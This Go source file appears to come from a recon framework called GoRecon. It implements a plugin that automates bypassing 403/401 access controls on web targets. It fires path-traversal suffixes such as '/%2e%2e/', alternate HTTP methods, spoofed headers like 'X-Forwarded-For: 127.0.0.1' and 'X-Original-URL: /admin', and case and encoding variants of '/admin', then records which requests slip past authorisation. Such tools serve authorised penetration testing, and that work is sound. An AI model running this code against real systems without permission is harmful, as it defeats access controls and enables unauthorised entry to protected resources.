package bypass

import (
	"bufio"
	"context"
	"encoding/json"
	"fmt"
	"net/http"
	"os"
	"os/exec"
	"path/filepath"
	"strconv"
	"strings"
	"time"

	"github.com/fatih/color"
	"github.com/f2u0a0d3/GoRecon/pkg/core"
	"github.com/f2u0a0d3/GoRecon/pkg/models"
	"github.com/f2u0a0d3/GoRecon/pkg/plugins/base"
)

// Byp4xxPlugin implements 403/401 bypass techniques
type Byp4xxPlugin struct {
	*base.BaseAdapter
	config *Byp4xxConfig
}

// Byp4xxConfig contains bypass configuration
type Byp4xxConfig struct {
	Threads         int           `json:"threads"`
	Timeout         time.Duration `json:"timeout"`
	MaxPayloads     int           `json:"max_payloads"`
	SkipCodeCheck   bool          `json:"skip_code_check"`
	CustomHeaders   []string      `json:"custom_headers"`
	CustomPayloads  []string      `json:"custom_payloads"`
}

// BypassResult represents a successful bypass
type BypassResult struct {
	URL           string            `json:"url"`
	OriginalCode  int               `json:"original_code"`
	BypassCode    int               `json:"bypass_code"`
	Technique     string            `json:"technique"`
	Payload       string            `json:"payload"`
	Headers       map[string]string `json:"headers"`
	Success       bool              `json:"success"`
	ResponseTime  time.Duration     `json:"response_time"`
	ContentLength int               `json:"content_length"`
	Timestamp     time.Time         `json:"timestamp"`
}

// NewByp4xxPlugin creates a new 403/401 bypass plugin
func NewByp4xxPlugin() *Byp4xxPlugin {
	config := &Byp4xxConfig{
		Threads:     10,
		Timeout:     15 * time.Second,
		MaxPayloads: 50,
		SkipCodeCheck: false,
		CustomHeaders: []string{
			"X-Forwarded-For: 127.0.0.1",
			"X-Real-IP: 127.0.0.1",
			"X-Originating-IP: 127.0.0.1",
			"X-Remote-IP: 127.0.0.1",
			"X-Client-IP: 127.0.0.1",
			"X-Remote-Addr: 127.0.0.1",
		},
	}

	baseAdapter := base.NewBaseAdapter(base.BaseAdapterConfig{
		Name:        "byp4xx",
		Category:    "bypass",
		Description: "403/401 bypass using various techniques",
		Version:     "1.0.0",
		Author:      "GoRecon Team",
		ToolName:    "byp4xx",
		Passive:     false,
		Duration:    45 * time.Minute,
		Concurrency: 1,
		Priority:    9,
		Resources: core.Resources{
			CPUCores:      2,
			MemoryMB:      512,
			NetworkAccess: true,
		},
		Provides: []string{"bypass_results"},
		Consumes: []string{"bypass_candidates", "http_status"},
	})

	return &Byp4xxPlugin{
		BaseAdapter: baseAdapter,
		config:      config,
	}
}

// Run executes 403/401 bypass attempts
func (b *Byp4xxPlugin) Run(ctx context.Context, target *models.Target, results chan<- models.PluginResult, shared *core.SharedContext) error {
	logger := shared.GetLogger().WithField("plugin", "byp4xx")
	
	white := color.New(color.FgWhite, color.Bold).SprintFunc()
	cyan := color.New(color.FgCyan).SprintFunc()

	domain := target.Domain
	if domain == "" {
		domain = b.ExtractDomain(target.URL)
	}

	fmt.Printf("\n%s\n", white("[GORECON] 403/401 Bypass Tool v1.0"))
	fmt.Printf("%s\n", strings.Repeat("=", 33))
	fmt.Printf("[%s] Attempting to bypass access controls\n", cyan("*"))

	// Get bypass candidates from previous stages (hakcheckurl results)
	bypassCandidates := b.getBypassCandidates(shared, domain)
	fmt.Printf("[%s] Found %d bypass candidates (403/401 responses)\n\n", cyan("*"), len(bypassCandidates))

	if len(bypassCandidates) == 0 {
		fmt.Printf("[%s] No bypass candidates found. Run httpprobe stage first.\n", cyan("*"))
		return nil
	}

	workDir := filepath.Join("./work", domain, "bypass")
	if err := os.MkdirAll(workDir, 0755); err != nil {
		return fmt.Errorf("failed to create workspace: %w", err)
	}
	
	rawDir := filepath.Join(workDir, "raw")
	if err := os.MkdirAll(rawDir, 0755); err != nil {
		return fmt.Errorf("failed to create directory: %w", err)
	}

	// Run bypass attempts
	bypassResults, err := b.runBypassAttempts(ctx, bypassCandidates, rawDir)
	if err != nil {
		logger.Error("Bypass attempts failed", err)
		return err
	}

	b.displayResults(bypassResults)
	b.generatePluginResults(target, bypassResults, results)
	b.addDiscoveries(shared, domain, bypassResults)

	logger.Info("Bypass attempts completed",
		"target", domain,
		"candidates", len(bypassCandidates),
		"successful_bypasses", b.countSuccessfulBypasses(bypassResults))

	return nil
}

func (b *Byp4xxPlugin) getBypassCandidates(shared *core.SharedContext, domain string) []BypassCandidate {
	var candidates []BypassCandidate
	
	// Get bypass candidates from discoveries (set by hakcheckurl)
	discoveries := shared.GetDiscoveries("")
	for _, discovery := range discoveries {
		if discovery.Type == "bypass_candidate" {
			if url, ok := discovery.Value.(string); ok {
				if strings.Contains(url, domain) {
					statusCode := 403 // Default
					if metadata, ok := discovery.Metadata["status_code"].(int); ok {
						statusCode = metadata
					}
					
					candidates = append(candidates, BypassCandidate{
						URL:        url,
						StatusCode: statusCode,
					})
				}
			}
		}
	}

	return candidates
}

type BypassCandidate struct {
	URL        string `json:"url"`
	StatusCode int    `json:"status_code"`
}

func (b *Byp4xxPlugin) runBypassAttempts(ctx context.Context, candidates []BypassCandidate, rawDir string) ([]BypassResult, error) {
	white := color.New(color.FgWhite, color.Bold).SprintFunc()
	cyan := color.New(color.FgCyan).SprintFunc()

	fmt.Printf("%s\n", white("[GORECON::BYPASS] Access Control Bypass"))
	fmt.Printf("%s\n", strings.Repeat("=", 38))

	var allResults []BypassResult

	// Define bypass techniques
	techniques := []struct {
		name        string
		payloads    []string
		headers     map[string]string
		description string
	}{
		{
			name: "path_traversal",
			payloads: []string{
				"/..",
				"/../..",
				"/./",
				"//",
				"/%2e/",
				"/%2e%2e/",
				"/%252e%252e/",
				"/;/",
			},
			description: "Path traversal techniques",
		},
		{
			name: "http_methods",
			payloads: []string{
				"HEAD",
				"OPTIONS",
				"TRACE",
				"PUT",
				"DELETE",
				"PATCH",
			},
			description: "HTTP method override",
		},
		{
			name: "header_injection",
			headers: map[string]string{
				"X-Forwarded-For":     "127.0.0.1",
				"X-Real-IP":           "127.0.0.1",
				"X-Originating-IP":    "127.0.0.1",
				"X-Remote-IP":         "127.0.0.1",
				"X-Client-IP":         "127.0.0.1",
				"X-Remote-Addr":       "127.0.0.1",
				"X-Original-URL":      "/admin",
				"X-Rewrite-URL":       "/admin",
				"X-Override-URL":      "/admin",
				"Referer":             "http://localhost/admin",
			},
			description: "Header-based bypass",
		},
		{
			name: "case_manipulation",
			payloads: []string{
				// Convert path to different cases
			},
			description: "Case sensitivity bypass",
		},
		{
			name: "encoding_bypass",
			payloads: []string{
				// URL encode variations
			},
			description: "Encoding-based bypass",
		},
	}

	for _, candidate := range candidates {
		fmt.Printf("[%s] Attempting bypass: %s (Status: %d)\n", cyan("*"), candidate.URL, candidate.StatusCode)

		for _, technique := range techniques {
			fmt.Printf("[%s]   Trying %s...\n", cyan("*"), technique.description)
			
			results := b.attemptTechnique(ctx, candidate, technique)
			for _, result := range results {
				if result.Success {
					fmt.Printf("[%s]   SUCCESS: %s -> Status %d\n", cyan("+"), result.Technique, result.BypassCode)
				}
			}
			allResults = append(allResults, results...)
		}
		fmt.Println()
	}

	return allResults, nil
}

func (b *Byp4xxPlugin) attemptTechnique(ctx context.Context, candidate BypassCandidate, technique struct {
	name        string
	payloads    []string
	headers     map[string]string
	description string
}) []BypassResult {
	var results []BypassResult
	client := &http.Client{
		Timeout: b.config.Timeout,
		CheckRedirect: func(req *http.Request, via []*http.Request) error {
			return http.ErrUseLastResponse // Don't follow redirects
		},
	}

	switch technique.name {
	case "path_traversal":
		for _, payload := range technique.payloads {
			testURL := candidate.URL + payload
			result := b.testURL(client, testURL, candidate, technique.name, payload)
			results = append(results, result)
		}

	case "http_methods":
		for _, method := range technique.payloads {
			result := b.testMethodOverride(client, candidate.URL, candidate, method)
			results = append(results, result)
		}

	case "header_injection":
		for headerName, headerValue := range technique.headers {
			result := b.testHeaderBypass(client, candidate.URL, candidate, headerName, headerValue)
			results = append(results, result)
		}

	case "case_manipulation":
		// Generate case variations
		caseVariations := b.generateCaseVariations(candidate.URL)
		for _, variation := range caseVariations {
			result := b.testURL(client, variation, candidate, technique.name, "case_variation")
			results = append(results, result)
		}

	case "encoding_bypass":
		encodedVariations := b.generateEncodingVariations(candidate.URL)
		for _, variation := range encodedVariations {
			result := b.testURL(client, variation, candidate, technique.name, "encoding")
			results = append(results, result)
		}
	}

	return results
}

func (b *Byp4xxPlugin) testURL(client *http.Client, testURL string, original BypassCandidate, technique, payload string) BypassResult {
	start := time.Now()
	
	req, err := http.NewRequest("GET", testURL, nil)
	if err != nil {
		return BypassResult{
			URL:          testURL,
			OriginalCode: original.StatusCode,
			Technique:    technique,
			Payload:      payload,
			Success:      false,
			Timestamp:    time.Now(),
		}
	}

	resp, err := client.Do(req)
	responseTime := time.Since(start)
	
	if err != nil {
		return BypassResult{
			URL:          testURL,
			OriginalCode: original.StatusCode,
			Technique:    technique,
			Payload:      payload,
			Success:      false,
			ResponseTime: responseTime,
			Timestamp:    time.Now(),
		}
	}
	defer resp.Body.Close()

	success := b.isSuccessfulBypass(original.StatusCode, resp.StatusCode)

	return BypassResult{
		URL:           testURL,
		OriginalCode:  original.StatusCode,
		BypassCode:    resp.StatusCode,
		Technique:     technique,
		Payload:       payload,
		Success:       success,
		ResponseTime:  responseTime,
		ContentLength: int(resp.ContentLength),
		Timestamp:     time.Now(),
	}
}

func (b *Byp4xxPlugin) testMethodOverride(client *http.Client, url string, original BypassCandidate, method string) BypassResult {
	start := time.Now()
	
	req, err := http.NewRequest(method, url, nil)
	if err != nil {
		return BypassResult{
			URL:          url,
			OriginalCode: original.StatusCode,
			Technique:    "method_override",
			Payload:      method,
			Success:      false,
			Timestamp:    time.Now(),
		}
	}

	resp, err := client.Do(req)
	responseTime := time.Since(start)
	
	if err != nil {
		return BypassResult{
			URL:          url,
			OriginalCode: original.StatusCode,
			Technique:    "method_override", 
			Payload:      method,
			Success:      false,
			ResponseTime: responseTime,
			Timestamp:    time.Now(),
		}
	}
	defer resp.Body.Close()

	success := b.isSuccessfulBypass(original.StatusCode, resp.StatusCode)

	return BypassResult{
		URL:           url,
		OriginalCode:  original.StatusCode,
		BypassCode:    resp.StatusCode,
		Technique:     "method_override",
		Payload:       method,
		Success:       success,
		ResponseTime:  responseTime,
		ContentLength: int(resp.ContentLength),
		Timestamp:     time.Now(),
	}
}

func (b *Byp4xxPlugin) testHeaderBypass(client *http.Client, url string, original BypassCandidate, headerName, headerValue string) BypassResult {
	start := time.Now()
	
	req, err := http.NewRequest("GET", url, nil)
	if err != nil {
		return BypassResult{
			URL:          url,
			OriginalCode: original.StatusCode,
			Technique:    "header_bypass",
			Payload:      fmt.Sprintf("%s: %s", headerName, headerValue),
			Success:      false,
			Timestamp:    time.Now(),
		}
	}

	req.Header.Set(headerName, headerValue)
	
	resp, err := client.Do(req)
	responseTime := time.Since(start)
	
	if err != nil {
		return BypassResult{
			URL:          url,
			OriginalCode: original.StatusCode,
			Technique:    "header_bypass",
			Payload:      fmt.Sprintf("%s: %s", headerName, headerValue),
			Success:      false,
			ResponseTime: responseTime,
			Timestamp:    time.Now(),
		}
	}
	defer resp.Body.Close()

	success := b.isSuccessfulBypass(original.StatusCode, resp.StatusCode)

	return BypassResult{
		URL:           url,
		OriginalCode:  original.StatusCode,
		BypassCode:    resp.StatusCode,
		Technique:     "header_bypass",
		Payload:       fmt.Sprintf("%s: %s", headerName, headerValue),
		Headers:       map[string]string{headerName: headerValue},
		Success:       success,
		ResponseTime:  responseTime,
		ContentLength: int(resp.ContentLength),
		Timestamp:     time.Now(),
	}
}

func (b *Byp4xxPlugin) isSuccessfulBypass(originalCode, newCode int) bool {
	// Consider it a successful bypass if:
	// 1. Original was 403/401 and new is 200/302/301
	// 2. Status code changed to something more permissive
	if (originalCode == 403 || originalCode == 401) {
		return newCode == 200 || newCode == 302 || newCode == 301 || newCode == 307
	}
	return false
}

func (b *Byp4xxPlugin) generateCaseVariations(url string) []string {
	// Generate case variations of the URL path
	variations := []string{}
	// Simple case variations - could be expanded
	if strings.Contains(url, "/admin") {
		variations = append(variations, strings.ReplaceAll(url, "/admin", "/ADMIN"))
		variations = append(variations, strings.ReplaceAll(url, "/admin", "/Admin"))
		variations = append(variations, strings.ReplaceAll(url, "/admin", "/aDmIn"))
	}
	return variations
}

func (b *Byp4xxPlugin) generateEncodingVariations(url string) []string {
	// Generate URL encoding variations
	variations := []string{}
	// Simple encoding variations - could be expanded
	if strings.Contains(url, "/admin") {
		variations = append(variations, strings.ReplaceAll(url, "/admin", "/%61dmin"))
		variations = append(variations, strings.ReplaceAll(url, "/admin", "/a%64min"))
		variations = append(variations, strings.ReplaceAll(url, "/admin", "/%2561dmin"))
	}
	return variations
}

func (b *Byp4xxPlugin) displayResults(results []BypassResult) {
	green := color.New(color.FgGreen).SprintFunc()
	red := color.New(color.FgRed).SprintFunc()
	yellow := color.New(color.FgYellow).SprintFunc()
	cyan := color.New(color.FgCyan).SprintFunc()

	successfulBypasses := 0
	for _, result := range results {
		if result.Success {
			successfulBypasses++
			fmt.Printf("[%s] BYPASS SUCCESS: %s\n", green("+"), result.URL)
			fmt.Printf("    Technique: %s\n", result.Technique)
			fmt.Printf("    Payload: %s\n", result.Payload)
			fmt.Printf("    Original: %d -> Bypass: %d\n", result.OriginalCode, result.BypassCode)
			fmt.Printf("    Response Time: %v\n", result.ResponseTime)
			fmt.Println()
		}
	}

	fmt.Printf("[%s] Bypass Summary:\n", cyan("*"))
	fmt.Printf("    Total attempts: %d\n", len(results))
	fmt.Printf("    Successful bypasses: %d\n", successfulBypasses)
	
	if successfulBypasses > 0 {
		fmt.Printf("[%s] %d access control bypasses discovered!\n", yellow("!"), successfulBypasses)
	} else {
		fmt.Printf("[%s] No bypasses found\n", red("-"))
	}
}

func (b *Byp4xxPlugin) generatePluginResults(target *models.Target, results []BypassResult, resultsChan chan<- models.PluginResult) {
	for _, result := range results {
		if !result.Success {
			continue
		}

		severity := models.SeverityHigh
		if result.OriginalCode == 403 {
			severity = models.SeverityCritical // 403 bypass is critical
		}

		pluginResult := models.PluginResult{
			Plugin:      "byp4xx",
			Target:      result.URL,
			Severity:    severity,
			Title:       fmt.Sprintf("Access Control Bypass: %s", result.Technique),
			Description: fmt.Sprintf("Successfully bypassed %d status code using %s technique", result.OriginalCode, result.Technique),
			Data: map[string]interface{}{
				"url":            result.URL,
				"original_code":  result.OriginalCode,
				"bypass_code":    result.BypassCode,
				"technique":      result.Technique,
				"payload":        result.Payload,
				"headers":        result.Headers,
				"response_time":  result.ResponseTime.String(),
				"content_length": result.ContentLength,
			},
			Timestamp: time.Now(),
		}
		resultsChan <- pluginResult
	}
}

func (b *Byp4xxPlugin) addDiscoveries(shared *core.SharedContext, domain string, results []BypassResult) {
	for _, result := range results {
		if !result.Success {
			continue
		}

		shared.AddDiscovery(models.Discovery{
			Type:       "bypass_success",
			Value:      result.URL,
			Source:     "byp4xx",
			Confidence: 0.95,
			Timestamp:  time.Now(),
			Metadata: map[string]interface{}{
				"original_code":  result.OriginalCode,
				"bypass_code":    result.BypassCode,
				"technique":      result.Technique,
				"payload":        result.Payload,
				"domain":         domain,
				"response_time":  result.ResponseTime.String(),
			},
		})
	}
}

func (b *Byp4xxPlugin) countSuccessfulBypasses(results []BypassResult) int {
	count := 0
	for _, result := range results {
		if result.Success {
			count++
		}
	}
	return count
}